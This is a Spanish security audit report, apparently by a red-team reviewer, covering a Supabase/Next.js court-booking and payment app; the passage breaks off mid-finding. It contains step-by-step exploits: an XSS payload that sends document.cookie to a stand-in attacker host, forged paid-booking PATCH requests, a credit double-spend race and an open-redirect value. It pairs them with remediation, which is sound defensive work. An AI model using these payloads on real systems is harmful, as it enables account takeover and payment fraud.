# Auditoría de Seguridad — Ronda 2

**Fecha:** 2026-09-01
**Commit base:** `a1f7e7f` (*Feat: Add pg_cron job to delete abandoned bookings after 3 minutes*) — **working tree sucio, 148 archivos sin commitear**
**Alcance:** código del working tree actual. `npx tsc --noEmit` limpio, `next lint` limpio (0 warnings). Ninguna línea fue modificada durante esta auditoría.
**Perfil del auditor:** red team ofensivo. El objetivo no es validar el trabajo hecho, es robar plata, reservas y datos.

---

## Resumen ejecutivo

**¿Pondría dinero real a correr sobre esto? NO. Ni un peso.**

Encontré tres caminos independientes y confirmados por lectura de código para (a) tomar la cuenta de cualquier usuario incluido el `platform_admin` vía XSS almacenado en la ficha pública de complejo, (b) obtener reservas `confirmed` + `payment_status='paid'` en canchas ajenas sin pagar un centavo, y (c) gastar el mismo crédito N veces en paralelo. Los tres son explotables por **cualquier usuario que se logueó una vez con Google**, sin necesidad de rol especial, porque la política RLS de `venues` deja que cualquiera se auto-declare dueño de un complejo (`002_rls_policies.sql:33`) — y esa capacidad es la llave maestra que abre el resto de los agujeros.

El patrón de fondo es peor que cualquier hallazgo individual: la autorización está delegada casi por completo a RLS y a dos triggers de Postgres, y esos triggers tienen bypasses estructurales (`NEW.court_id` controlado por el atacante, GUC legacy de PostgREST). Las Server Actions del dashboard **no verifican rol ni ownership** — literalmente `if (!user) throw`. Cuando la única defensa es RLS y RLS tiene un agujero, no hay segunda línea.

Además hay tres "remediaciones" del reporte del 01-Sep que **no remedian nada**: la firma del webhook de Mercado Pago es opcional y el secreto no existe en el entorno; el "credit lock" de la migración 019 no da atomicidad alguna; y la protección de PII de profiles se reemplazó por una vista `SECURITY DEFINER` sin `REVOKE` que sigue exponiendo el padrón completo de usuarios a la anon key.

Y como frutilla: la política de cancelación **está rota por un `NaN`** — nadie recupera nunca su seña en crédito, aunque el email de confirmación se lo promete por escrito. Eso no es un bug de seguridad, es exposición legal.

**Veredicto: no apto para producción con dinero real. Requiere un rediseño del modelo de autorización, no parches puntuales.**

---

## Tabla de hallazgos

| ID | Severidad | Título | Ubicación |
|----|-----------|--------|-----------|
| SEC-01 | **CRÍTICO** | XSS almacenado en JSON-LD de `/venue/[id]` → toma de cuenta (incl. platform_admin) | `src/app/(main)/venue/[id]/page.tsx:153` |
| SEC-02 | **CRÍTICO** | Bypass total del trigger `protect_booking_fields` vía `NEW.court_id` → reserva pagada sin pagar | `supabase/migrations/018_fix_triggers_auth.sql:45-51` |
| SEC-03 | **CRÍTICO** | Cualquier usuario autenticado puede auto-declararse dueño de complejo (llave maestra) | `supabase/migrations/002_rls_policies.sql:33-34` |
| SEC-04 | **CRÍTICO** | Doble gasto de créditos por race condition (falso remediado NEG-02) | `src/lib/credits/manager.ts:106-163` + `create-preference/route.ts:62-103` |
| SEC-05 | **ALTO** | Firma del webhook MP es opcional y `MP_WEBHOOK_SECRET` no existe (falso remediado SEC-03) | `src/app/api/webhooks/mercadopago/route.ts:27-32` |
| SEC-06 | **ALTO** | Bucket `chat-images` público + policy `TO public` → todos los adjuntos privados son descargables por cualquiera | `supabase/migrations/010_chat_attachments_and_storage.sql:5-20` |
| SEC-07 | **ALTO** | Edge Functions sin ninguna autorización, corren con `service_role` | `supabase/functions/expire-credits/index.ts:5-21` |
| SEC-08 | **ALTO** | Bypass `service_role` de los triggers usa un GUC legacy de PostgREST → el webhook probablemente falla al confirmar pagos | `supabase/migrations/018_fix_triggers_auth.sql:8,35` |
| SEC-09 | **ALTO** | RLS de `reviews` no liga `venue_id` con el booking → review bombing de cualquier complejo | `supabase/migrations/015_close_phase_0.sql:23-30` |
| SEC-10 | **ALTO** | Dueño de complejo puede reescribir `rating` y `comment` de las reseñas ajenas de su venue | `supabase/migrations/002_rls_policies.sql:103-106` |
| SEC-11 | **ALTO** | Server Actions del dashboard sin guard de rol ni de ownership | `src/app/dashboard/bookings/actions.ts:7-39` |
| SEC-12 | **ALTO** | Crédito emitido sin verificar que la seña se haya pagado (latente) | `src/lib/booking/actions.ts:40-43` |
| SEC-13 | **ALTO** | `idempotencyKey: 'abc'` global y estático en el cliente de Mercado Pago | `src/lib/mercadopago/client.ts:6` |
| SEC-14 | **ALTO** | Política de cancelación rota por `NaN` → jamás se devuelve crédito, jamás se puede reprogramar | `src/lib/utils/dates.ts:60` |
| SEC-15 | **MEDIO** | Open redirect en el callback de OAuth (`?next=@evil.com`) | `src/app/(auth)/callback/route.ts:14` |
| SEC-16 | **MEDIO** | La página de éxito afirma "pago procesado" sin mirar `payment_status` → comprobante falso | `src/app/(main)/booking/[courtId]/success/page.tsx:63-64,90-95` |
| SEC-17 | **MEDIO** | Reprogramación sin recotizar precio y sin límite de intentos | `src/lib/booking/actions.ts:94-100` |
| SEC-18 | **MEDIO** | Inyección de HTML en el email de notificación de chat (dominio con DKIM propio) | `src/app/actions/chat.ts:66` |
| SEC-19 | **MEDIO** | Inyección de filtros PostgREST vía `.or()` con input crudo | `src/app/(main)/search/page.tsx:55` |
| SEC-20 | **MEDIO** | Vista `public_user_profiles` sin `security_invoker` ni `REVOKE` → padrón de usuarios enumerable | `supabase/migrations/015_close_phase_0.sql:16-18` |
| SEC-21 | **MEDIO** | Ninguna función `SECURITY DEFINER` fija `search_path` (12 funciones) | `002:11-19`, `018:4,31`, `019:5`, `020:3` |
| SEC-22 | **MEDIO** | Storage sin límite de tamaño, sin MIME allowlist y con path arbitrario | `supabase/migrations/010_chat_attachments_and_storage.sql:5-16` |
| SEC-23 | **MEDIO** | Sin cabeceras de seguridad ni CSP; sin rate limiting en ninguna superficie | `next.config.mjs:1-15` |
| SEC-24 | **MEDIO** | Fuga de `error.message` crudo en respuestas 500 | `create-preference/route.ts:116`, `webhooks/mercadopago/route.ts:96` |
| SEC-25 | **MEDIO** | `bookings` no tiene política `FOR DELETE` → `cancelPendingBooking` miente al usuario | `src/app/actions/booking.ts:11-23` |
| SEC-26 | **BAJO** | Zod instalado, `validators.ts` escrito, **cero importadores** en toda la base | `src/lib/utils/validators.ts:1-75` |
| SEC-27 | **BAJO** | `NEXT_PUBLIC_APP_URL` ausente → `notification_url` y `back_urls` apuntan a `localhost:3000` | `src/lib/mercadopago/client.ts:20` |
| SEC-28 | **BAJO** | Ruta `/mock-payment` eliminada pero el código sigue generando su URL | `src/lib/mercadopago/client.ts:26-27` |
| SEC-29 | **BAJO** | Regresión: el cron de purga volvió de 15 min a 3 min | `supabase/migrations/019_credit_locks.sql:15,22` |

**Conteo:** 4 CRÍTICO · 10 ALTO · 11 MEDIO · 4 BAJO.

---

## Detalle por hallazgo

### SEC-01 — CRÍTICO — XSS almacenado en el JSON-LD de la ficha pública de complejo

**Ubicación:** `src/app/(main)/venue/[id]/page.tsx:153` (payload) y `:124-147` (construcción del objeto).

```tsx
// src/app/(main)/venue/[id]/page.tsx:124-131
  const jsonLd = {
    '@context': 'https://schema.org',
    '@type': 'SportsActivityLocation',
    name: venue.name,
    description: venue.description || `Canchas de fútbol en ${venue.city}`,
    ...
// src/app/(main)/venue/[id]/page.tsx:151-154
      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
      />
```

**Por qué es explotable.** `JSON.stringify` escapa comillas y backslashes, pero **no** escapa `<` ni la secuencia `</script>`. Lo verifiqué localmente:

```
$ node -e "console.log(JSON.stringify({name:'</script><script>alert(1)</script>'}))"
{"name":"</script><script>alert(1)</script>"}
```

El parser HTML del navegador corta el `<script type="application/ld+json">` en el primer `</script>` literal y ejecuta lo que sigue como script normal.

Paso a paso del ataque:

1. Atacante se registra con Google (`player`, sin permisos especiales).
2. Desde la consola del navegador, con la anon key pública:
   `supabase.from('venues').insert({ owner_id: <mi uid>, name: '</script><script>fetch("https://evil.tld/x?c="+document.cookie)</script>', address: 'x', city: 'La Plata' })`
   La política `002_rls_policies.sql:33-34` lo permite (ver **SEC-03**). `is_active` es `DEFAULT TRUE` (`001_initial_schema.sql:32`), así que el complejo queda público al instante.
3. La ficha `/venue/<id>` se sirve con `createPublicClient()` filtrando `is_active = true` (`venue/[id]/page.tsx:22-25`) → el payload se renderiza a cualquier visitante, autenticado o no.
4. Atacante manda el link por el chat de la plataforma al dueño de un complejo real o, mejor, al `platform_admin` (que revisa `/admin/moderation`).
5. `@supabase/ssr` guarda la sesión en cookies legibles desde JS (el cliente de navegador las lee con `document.cookie`; no son `httpOnly`). El script exfiltra `sb-<ref>-auth-token` → sesión completa de la víctima.

**Impacto.** Toma de cuenta total. Con la sesión de un `platform_admin` el atacante hereda `is_platform_admin()` en todas las policies: lectura de la tabla `profiles` completa (email + teléfono de toda la base), UPDATE libre de `credits`, y bypass incondicional de ambos triggers de protección (`018:13-15,39-42`). Con la de un dueño de complejo: control de precios, reservas y caja de ese predio. Pérdida potencial: todo el GMV de la plataforma.

**Remediación sugerida.** Escapar el JSON antes de inyectarlo: reemplazar `<` por `<` (y `>` `&` por prolijidad) sobre el resultado de `JSON.stringify`, o servir el structured data por un mecanismo que no pase por `dangerouslySetInnerHTML`. En paralelo, sanitizar `venues.name`/`description` en escritura y añadir una CSP con `script-src` sin `unsafe-inline` (ver SEC-23).

---

### SEC-02 — CRÍTICO — Bypass total de `protect_booking_fields` moviendo `court_id`

**Ubicación:** `supabase/migrations/018_fix_triggers_auth.sql:44-51` (rama de bypass) y `:53-79` (checks que se saltean). Idéntico en `014:16-23` y `017:18-25`.

```sql
-- 018_fix_triggers_auth.sql:44-51
  -- Allow bypassing if the user is the owner of the venue
  IF EXISTS (
      SELECT 1 FROM public.courts c
      JOIN public.venues v ON c.venue_id = v.id
      WHERE c.id = NEW.court_id AND v.owner_id = auth.uid()
  ) THEN
    RETURN NEW;
  END IF;
```

**Por qué es explotable.** El trigger decide si aplicar los checks de jugador mirando **`NEW.court_id`**, un campo que el propio atacante escribe en el mismo `UPDATE`. Y en ninguna parte del trigger se prohíbe cambiar `court_id`. La política RLS de UPDATE (`002_rls_policies.sql:80-88`) no tiene `WITH CHECK` explícito, así que Postgres reutiliza el `USING` como `WITH CHECK`: alcanza con ser dueño de la reserva **o** dueño del venue de la fila nueva.

Secuencia concreta (todo con la anon key desde el navegador, sin tocar la UI del dashboard):

1. `insert into venues (owner_id, name, address) values (<mi uid>, 'X', 'X')` → venue `V` (habilitado por **SEC-03**).
2. `insert into courts (venue_id, name, type, surface) values (V, 'C', 'F5', 'sintetico')` → cancha `C`. Permitido por `002:48-51` (`FOR ALL` sin `WITH CHECK` → se reutiliza el `USING`).
3. Reservar normalmente en la cancha ajena `X` vía `POST /api/booking/create-preference` → queda booking `B` con `payment_status='pending'`, `status='pending'`, `total_price=25000`, `deposit_amount=7500`. **Abandonar el pago.**
4. `PATCH /rest/v1/bookings?id=eq.B` con
   `{"court_id":"C","payment_status":"paid","status":"confirmed"}`
   → el trigger ve `NEW.court_id = C`, que es mío → `RETURN NEW`. **Ningún check corre.**
5. `PATCH /rest/v1/bookings?id=eq.B` con `{"court_id":"X"}`
   → el trigger ve `NEW.court_id = X`, ajeno → cae a los checks de jugador: `payment_status` no cambia (ya es `'paid'`), `status` no cambia, `total_price`/`deposit_amount` no cambian, fechas no cambian, `is_rescheduled` no cambia → **pasa**.

Resultado: reserva `confirmed` + `paid` en la cancha de la víctima, con $0 desembolsados. En el paso 4 también se pueden reescribir `booking_date`, `start_time` y `end_time` libremente, así que el mismo truco permite tomarse el horario prime del sábado por el precio del martes al mediodía — o por nada.

**Impacto.** Robo directo de inventario y de la seña. Sobre una cancha de $25.000 con seña 30%, cada explotación son $7.500 que el complejo nunca cobra más el turno perdido. Es repetible en bucle y no deja rastro distinguible de una reserva legítima: en el dashboard del dueño aparece como pagada.

**Remediación sugerida.** (a) Prohibir explícitamente que un jugador cambie `court_id` (y `user_id`) en el trigger, con la misma lógica que ya se aplica a fechas en `018:72-75`. (b) Evaluar la rama de bypass del dueño contra **`OLD.court_id`**, no contra `NEW.court_id` — la autorización debe depender del estado previo, nunca del que el atacante propone. (c) Cerrar SEC-03 para que el rol de dueño de complejo no sea auto-servicio.

---

### SEC-03 — CRÍTICO — Cualquier usuario autenticado puede declararse dueño de un complejo

**Ubicación:** `supabase/migrations/002_rls_policies.sql:33-34`.

```sql
CREATE POLICY "Venue owners and admins can insert venues" ON public.venues
FOR INSERT WITH CHECK (owner_id = auth.uid() OR public.is_platform_admin());
```

Y la UI lo hace exactamente así, desde el navegador con la anon key:

```tsx
// src/app/dashboard/venue/new/page.tsx:17-37
  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  )
  ...
    const { error } = await supabase.from('venues').insert({
      owner_id: user.id,
      name: formData.get('name'),
```

**Por qué es explotable.** La policy no exige `role IN ('venue_admin','platform_admin')`. El único control de rol vive en `src/app/dashboard/layout.tsx:25-27`, que es una redirección de UI — irrelevante para quien hable directo con `https://<ref>.supabase.co/rest/v1/venues`. Un `player` recién registrado hace un `POST` y a partir de ese momento es `owner_id` de un venue.

Eso no es un problema estético: la condición `v.owner_id = auth.uid()` aparece como cláusula de confianza en **seis** políticas y en el trigger de bookings (`002:45,50,62,73,86,105`; `018:48`). Auto-provisionarse un venue es la escalada de privilegios que habilita SEC-02, SEC-09 y SEC-10.

**Impacto.** Es el multiplicador de todo el resto. Por sí solo: contaminación del catálogo público con complejos falsos (que además son el vector de SEC-01).

**Remediación sugerida.** Exigir en el `WITH CHECK` que el perfil del insertante tenga `role IN ('venue_admin','platform_admin')`, y mover el alta de complejo a una Server Action con `createAdminClient()` que valide el rol y, idealmente, un proceso de verificación (onboarding manual o KYC del comercio). Revocar el `INSERT` de `venues` al rol `authenticated`.

---

### SEC-04 — CRÍTICO — Doble gasto de créditos: el "credit lock" de la 019 no da atomicidad

**Ubicación:** `src/app/api/booking/create-preference/route.ts:62-103` y `src/lib/credits/manager.ts:85-163`.

```ts
// src/app/api/booking/create-preference/route.ts:61-65
    const credits = await getAvailableCredits(user.id, venueId)
    if (credits > 0 && amountToPay > 0) {
      amountToPay = credits >= depositAmount ? 0 : depositAmount - credits
    }
// ...:88-103
    if (credits > 0 && depositAmount > 0) {
      await applyCredits(user.id, bookingId, venueId, Math.min(credits, depositAmount))
    }
    if (amountToPay === 0) {
      await adminSupabase.from('bookings')
        .update({ status: 'confirmed', payment_status: 'paid' } as never)
        .eq('id', bookingId)
```

```ts
// src/lib/credits/manager.ts:112-118  (el "lock")
  const { data: credits, error } = await supabase.from('credits')
    .select('*')
    .eq('user_id', userId).eq('venue_id', venueId).eq('status', 'available')
    .is('locked_for_booking_id', null)
    .gt('expires_at', now)
    .order('expires_at', { ascending: true })
```

**Por qué es explotable.** `019_credit_locks.sql` agrega la columna `locked_for_booking_id` pero **no agrega ninguna transacción, ningún `SELECT ... FOR UPDATE`, ningún `UPDATE ... WHERE locked_for_booking_id IS NULL` condicional**. El flujo es: leer por PostgREST → decidir en Node → escribir por PostgREST. Son round-trips HTTP independientes, sin transacción común. La ventana entre la lectura de `getAvailableCredits` (línea 62) y el `UPDATE` de `applyCredits` (línea 136/154) es de decenas de milisegundos y es trivialmente ganable.

Paso a paso:

1. El atacante tiene un crédito legítimo de $7.500 en el complejo `V` (o los que sean).
2. Dispara **10 requests simultáneos** a `POST /api/booking/create-preference`, cada uno para un slot distinto de `V` (distinta fecha/hora, así el índice único parcial de `008` no molesta), cada uno con `deposit_amount = 7500`.
3. Las 10 instancias ejecutan `getAvailableCredits` antes de que ninguna haya escrito: **las 10 leen `credits = 7500`**.
4. Las 10 calculan `amountToPay = 0` (línea 64).
5. Las 10 llaman `applyCredits`, que hace `UPDATE credits SET locked_for_booking_id = <su bookingId>` — se pisan entre sí, gana la última, pero **ninguna falla**.
6. Las 10 entran en `if (amountToPay === 0)` y marcan su booking `confirmed` + `paid` con el admin client.

Resultado: **10 reservas pagadas con un solo crédito de $7.500**. El multiplicador solo está limitado por la concurrencia que aguante el runtime.

Nota adicional: en esa rama nunca se llama `consumeLockedCredits()` (solo se invoca en el webhook, `webhooks/mercadopago/route.ts:76`), así que el crédito queda `status='available'` con un `locked_for_booking_id` colgado, y el cron de `019:9-16` lo **desbloquea** cuando purga reservas pendientes — devolviéndolo a circulación.

**Impacto.** Reservas gratis ilimitadas a partir de un único crédito real. Sobre señas de $7.500, diez requests paralelos son $67.500 de inventario regalado por ciclo, repetible.

**Remediación sugerida.** Mover toda la operación (leer disponible → bloquear → confirmar) a una función RPC de Postgres `SECURITY DEFINER` con `search_path` fijo que corra en una única transacción con `SELECT ... FOR UPDATE` sobre las filas de `credits`, y que devuelva el monto efectivamente bloqueado. El caller nunca debe decidir el monto en Node sobre datos leídos antes.

**Falso remediado:** `06-reporte-resolucion-final.md` marca `NEG-02 — Doble gasto de créditos (race condition)` como **✅ Resuelto** citando `019_credit_locks.sql`. No lo está.

---

### SEC-05 — ALTO — La firma del webhook de Mercado Pago es opcional, y el secreto no existe

**Ubicación:** `src/app/api/webhooks/mercadopago/route.ts:19-32`.

```ts
    const secret = process.env.MP_WEBHOOK_SECRET

    if (!xSignature || !xRequestId) {
      return NextResponse.json({ error: 'Missing security headers' }, { status: 403 })
    }
    if (secret) {
      const isValid = verifyWebhookSignature(xSignature, xRequestId, id, secret)
      if (!isValid) {
        return NextResponse.json({ error: 'Firma inválida' }, { status: 403 })
      }
    }
```

**Por qué es explotable.** `if (secret)` convierte el control criptográfico en opt-in. Y `.env.local` **no define `MP_WEBHOOK_SECRET`** — las únicas variables presentes son `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`, `SUPABASE_SERVICE_ROLE_KEY`, `MERCADOPAGO_ACCESS_TOKEN` y `RESEND_API_KEY`. Tampoco figura en `.env.local.example`, con lo cual nadie lo va a setear al desplegar. Conclusión: **hoy el webhook no verifica ninguna firma.** Los únicos requisitos para pasar son mandar dos headers cualesquiera (`x-signature: a`, `x-request-id: b`).

Ataque:

```
POST /api/webhooks/mercadopago?topic=payment&data.id=<N>
x-signature: x
x-request-id: x
```

Lo que el atacante gana hoy es acotado, porque la ruta después consulta el pago real contra la API de MP con el token del comercio (`route.ts:41`) y toma el `external_reference` de ahí, no del body. Por eso lo califico ALTO y no CRÍTICO. Pero:

- Es un endpoint **no autenticado que dispara una llamada saliente a la API de MP y una escritura en DB por request** → agotamiento de rate limit de Mercado Pago y del runtime serverless, sin coste para el atacante.
- Permite **replay** de notificaciones legítimas. La idempotencia depende de una lectura-y-comparación no transaccional (`route.ts:53-56`) que dos requests concurrentes atraviesan a la vez, disparando `consumeLockedCredits` dos veces.
- Enumerando `data.id` un atacante puede inferir qué IDs de pago existen en la cuenta del comercio por la diferencia de latencia y de respuesta.
- Y sobre todo: cualquier cambio futuro que confíe en el body (lo habitual) lo vuelve explotable para confirmar reservas arbitrarias.

**Nota honesta:** `verifyWebhookSignature` en sí está **bien escrita**. El `crypto.timingSafeEqual` con buffers de distinta longitud lanza, pero el `try/catch` de `helpers.ts:45-48` lo captura y devuelve `false`. Eso **no** es un hallazgo. El problema es el `if (secret)` que la rodea.

**Impacto.** Superficie de webhook sin autenticar en la ruta que confirma dinero. Riesgo de DoS y de replay hoy; riesgo de confirmación fraudulenta ante cualquier refactor.

**Remediación sugerida.** Hacer `MP_WEBHOOK_SECRET` obligatorio: si falta, la ruta debe responder 500 y loguear crítico, nunca continuar. Añadir la variable a `.env.local.example`. Y hacer la idempotencia real con un `UPDATE ... WHERE id = $1 AND payment_status <> 'paid' RETURNING *` en lugar del patrón leer-luego-escribir.

**Falso remediado:** el reporte previo marca `SEC-03 — Webhook MP sin validación de firma` como **✅ Resuelto** citando `crypto.timingSafeEqual`. La función existe; la verificación no corre.

---

### SEC-06 — ALTO — Todos los adjuntos de chat privado son públicos y listables

**Ubicación:** `supabase/migrations/010_chat_attachments_and_storage.sql:5-20`.

```sql
INSERT INTO storage.buckets (id, name, public)
VALUES ('chat-images', 'chat-images', true)
ON CONFLICT (id) DO NOTHING;
...
CREATE POLICY "Anyone can view chat images"
ON storage.objects FOR SELECT TO public
USING (bucket_id = 'chat-images');
```

**Por qué es explotable.** Dos capas fallan a la vez: el bucket es `public = true` (URL directa sin token) **y** la policy de `SELECT` sobre `storage.objects` es `TO public USING (bucket_id = 'chat-images')`, lo que habilita el **listado** del bucket vía la API de Storage. Los archivos se guardan como `${conversationId}/${Date.now()}.${fileExt}` (`src/components/chat/player-chat-modal.tsx:182-186`), así que la estructura de carpetas es un índice de conversaciones.

Ataque, sin ninguna cuenta, solo con la anon key que viaja en el bundle JS:

1. `supabase.storage.from('chat-images').list('', { limit: 1000 })` → lista de todos los `conversation_id` con adjuntos.
2. Para cada uno, `list('<conversation_id>')` → todos los archivos.
3. `getPublicUrl(...)` de cada uno → descarga.

**Impacto.** Lectura masiva de contenido privado: fotos de comprobantes de transferencia, DNI, capturas de conversaciones, lo que sea que jugadores y dueños se manden por el canal que la app presenta como privado. Es un incidente reportable bajo la Ley 25.326 de Protección de Datos Personales.

**Remediación sugerida.** Poner el bucket en `public = false` y servir los adjuntos con signed URLs de vida corta generadas en servidor tras verificar acceso a la conversación. Reemplazar la policy de `SELECT` por una que exija ser participante: comparar el primer segmento del `name` contra las `conversations` visibles para `auth.uid()`. Lo mismo aplica en menor grado a `venue-photos` (`010:9-11,35-37`), que sí es legítimamente público pero acepta escritura de cualquiera (ver SEC-22).

---

### SEC-07 — ALTO — Edge Functions con `service_role` y cero autorización

**Ubicación:** `supabase/functions/expire-credits/index.ts:5-21` y `supabase/functions/send-reminder/index.ts:5-24`.

```ts
serve(async (req) => {
  try {
    const supabaseClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
    )
    const now = new Date().toISOString()
    const { data, error } = await supabaseClient
      .from("credits")
      .update({ status: 'expired' })
      .eq('status', 'available')
      .lt('expires_at', now)
```

**Por qué es explotable.** Ninguna de las dos funciones inspecciona `req`. No hay `Authorization: Bearer <CRON_SECRET>`, no hay verificación de quién invoca, no hay allowlist de origen. El gate por defecto de Supabase (`verify_jwt`) se satisface con **cualquier JWT válido del proyecto, incluida la anon key pública**, que está en el bundle de la app. No hay `supabase/config.toml` en el repo, así que ni siquiera puedo confirmar si `verify_jwt` está activo.

Ataque: `curl -H "Authorization: Bearer <anon key del bundle>" https://<ref>.functions.supabase.co/expire-credits`.
Con `expires_at` en el pasado no pasa nada, pero la función es invocable a voluntad; combinada con cualquier manipulación de `expires_at` (hoy bloqueada por la policy de `015:6-7`) o simplemente para forzar la caducidad en el instante exacto en que un crédito vence, es una primitiva de escritura sobre la tabla de dinero. `send-reminder` es peor por lo simple: invocarla marca `reminder_sent = true` en todas las reservas del día **sin enviar nada** (el fetch de notificación está comentado, `send-reminder/index.ts:50-51`) → los usuarios pierden el recordatorio y el complejo come no-shows.

**Impacto.** Supresión de recordatorios a escala (no-shows = pérdida directa para los complejos) y una superficie de escritura sobre `credits` operable por cualquiera que abra el DevTools.

`[NO CONFIRMADO]` — si las funciones están efectivamente desplegadas y con qué valor de `verify_jwt`. Para confirmarlo hace falta `supabase functions list` contra el proyecto real o revisar el dashboard. Independientemente de eso, **el código de la función no autoriza nada**, y eso sí está confirmado.

**Remediación sugerida.** Exigir un header `Authorization: Bearer <CRON_SECRET>` comparado con `timingSafeEqual` contra un secreto exclusivo de las funciones (distinto de la anon key y del service_role), rechazar con 401 en caso contrario, y declarar `verify_jwt = false` en `config.toml` para que el gate real sea el secreto propio y no un JWT público.

---

### SEC-08 — ALTO — El bypass de `service_role` de los triggers usa un GUC que PostgREST ya no setea

**Ubicación:** `supabase/migrations/018_fix_triggers_auth.sql:7-10` y `:34-37`.

```sql
  -- Allow bypassing if it's the service_role (using JWT claim check instead of auth.uid() IS NULL)
  IF (NULLIF(current_setting('request.jwt.claim.role', true), '')) = 'service_role' THEN
    RETURN NEW;
  END IF;
```

**Por qué importa.** `request.jwt.claim.<nombre>` (singular, con punto) es el GUC **legacy** de PostgREST, retirado en PostgREST 9.0 en favor de `request.jwt.claims` (plural, JSON). Supabase corre PostgREST 12.x. Por eso el propio helper `auth.role()` de Supabase está escrito con un `coalesce` entre las dos formas — precisamente porque no puede confiar en la legacy.

Si el GUC no está seteado, `current_setting(..., true)` devuelve `NULL`, `NULLIF` propaga `NULL`, la comparación no es `TRUE` y **el trigger no toma la rama de bypass**. Sigue a `is_platform_admin()` (falso: `auth.uid()` es `NULL` para service_role) y a la rama de dueño de venue (falsa por lo mismo). Termina aplicando **los checks de jugador al cliente service_role**.

Consecuencias directas, todas sobre dinero:

- `webhooks/mercadopago/route.ts:58-71` hace `UPDATE bookings SET payment_status='paid', status='confirmed'` con el admin client → el trigger lanza `Unauthorized: Cannot modify payment status` → el `throw` de la línea 70 hace caer la ruta a 500 (`:93-97`) → **Mercado Pago cobra al usuario y la reserva nunca se confirma.** MP reintenta y vuelve a fallar.
- `lib/booking/actions.ts:94-100` (`rescheduleBooking`) explícitamente comenta "con permisos de administrador para sortear el trigger de BD" → lanza `Unauthorized: Cannot reschedule directly`.
- `create-preference/route.ts:95-97` (confirmación por crédito 100%) → mismo error.

`[NO CONFIRMADO]` — no puedo ejecutar SQL contra la base. Para confirmarlo: desde un cliente con `service_role`, ejecutar `select current_setting('request.jwt.claim.role', true), current_setting('request.jwt.claims', true)` vía RPC, o simplemente intentar el `UPDATE` de `payment_status` con el service_role y ver si el trigger lo rechaza. Si el bypass está roto, el flujo de pago está caído hoy en producción.

**Impacto.** O bien el flujo de confirmación de pagos está roto (usuarios pagados sin reserva, disputas y contracargos), o bien está funcionando por un GUC deprecado que desaparecerá en la próxima actualización de PostgREST y romperá el cobro sin previo aviso. Ambas son inaceptables.

**Remediación sugerida.** Usar `auth.role() = 'service_role'` (el helper oficial, que ya hace el `coalesce`) o replicar el `coalesce` entre `request.jwt.claim.role` y `(current_setting('request.jwt.claims',true)::jsonb->>'role')`. Añadir un test de integración que verifique que el service_role puede marcar una reserva como pagada.

---

### SEC-09 — ALTO — Review bombing: la RLS de reseñas no liga el `venue_id` con el booking

**Ubicación:** `supabase/migrations/015_close_phase_0.sql:23-30` (la política vigente; heredada sin cambios de `002:94-101`).

```sql
CREATE POLICY "Users can insert review if they have completed booking" ON public.reviews
FOR INSERT WITH CHECK (
    user_id = auth.uid() AND
    EXISTS (
        SELECT 1 FROM public.bookings b
        WHERE b.id = booking_id AND b.user_id = auth.uid() AND b.status = 'completed'
    )
);
```

**Por qué es explotable.** El `EXISTS` verifica que el booking sea del usuario y esté completado, pero **nunca comprueba que el `court_id` de ese booking pertenezca al `venue_id` que se está reseñando**. Son dos columnas independientes de la fila insertada y nada las relaciona.

Ataque:

1. Auto-provisionarse venue `V` y cancha `C` (SEC-03).
2. Crear una reserva propia en `C` (`bookings` INSERT con `user_id = auth.uid()`, permitido por `002:77-78`).
3. Marcarla `status='completed'` — como dueño de `C` la policy de UPDATE (`002:80-88`) lo permite y el trigger toma la rama de dueño (`018:44-51`). También sirve la Server Action `updateBookingStatus` (ver SEC-11).
4. `insert into reviews (user_id, venue_id, booking_id, rating, comment) values (<mi uid>, <venue de la VÍCTIMA>, <mi booking>, 1, '...')`.
5. El trigger `on_review_changed` (`001:160-162`) recalcula `avg_rating` de la víctima.

`booking_id` es `UNIQUE`, pero el atacante puede fabricar bookings propios ilimitados en su propia cancha: una reseña de 1★ por booking. Con 20 iteraciones (automatizables en segundos) hunde el rating de cualquier complejo.

**Impacto.** Destrucción de reputación de competidores; base para extorsión ("pagame o te bajo a 1 estrella"). En un marketplace el rating **es** el activo comercial del complejo.

**Remediación sugerida.** Añadir al `WITH CHECK` el join que falta: que el `venue_id` de la reseña coincida con `(SELECT c.venue_id FROM courts c WHERE c.id = b.court_id)`. Añadir también un `CHECK` de coherencia a nivel tabla o un trigger `BEFORE INSERT`.

---

### SEC-10 — ALTO — El dueño de complejo puede reescribir el rating y el texto de las reseñas ajenas

**Ubicación:** `supabase/migrations/002_rls_policies.sql:103-106`.

```sql
CREATE POLICY "Venue owners can update venue_response" ON public.reviews
FOR UPDATE USING (
    EXISTS (SELECT 1 FROM public.venues v WHERE v.id = venue_id AND v.owner_id = auth.uid()) OR public.is_platform_admin()
);
```

**Por qué es explotable.** El nombre de la política dice "venue_response", pero **RLS en Postgres no restringe columnas**. Para limitar el UPDATE a una columna hace falta un `GRANT UPDATE (venue_response) ON reviews TO authenticated` con el `GRANT UPDATE` general revocado. Grepeando todas las migraciones: **no hay un solo `GRANT` ni `REVOKE` en el repositorio.** Por lo tanto el `authenticated` conserva el `UPDATE` completo que las default privileges de Supabase le dan, y la policy simplemente lo autoriza sobre todas las reseñas del venue.

Ataque: `PATCH /rest/v1/reviews?venue_id=eq.<mi venue> → {"rating": 5, "comment": "Excelente lugar!"}`. Una sola llamada convierte todas las reseñas negativas del complejo en cincos, y el trigger `on_review_changed` (`001:139-162`) recalcula `avg_rating` a 5.00 automáticamente.

**Impacto.** El sistema de reputación es escribible por la parte interesada. Cualquier decisión de compra del usuario basada en las estrellas es fraudulenta. Combinado con SEC-09, el rating de la plataforma no tiene ningún valor informativo.

**Remediación sugerida.** `REVOKE UPDATE ON public.reviews FROM authenticated;` seguido de `GRANT UPDATE (venue_response, response_at) ON public.reviews TO authenticated;`. Auditar del mismo modo el resto de las tablas: sin GRANTs de columna, toda policy `FOR UPDATE` es una policy de tabla completa.

---

### SEC-11 — ALTO — Server Actions del dashboard sin guard de rol ni de ownership

**Ubicación:** `src/app/dashboard/bookings/actions.ts:7-22` y `:24-39`. Mismo patrón en `courts/actions.ts:48-65,67-99,101-159`.

```ts
export async function updatePaymentStatus(bookingId: string, paymentStatus: 'pending' | 'paid' | 'refunded') {
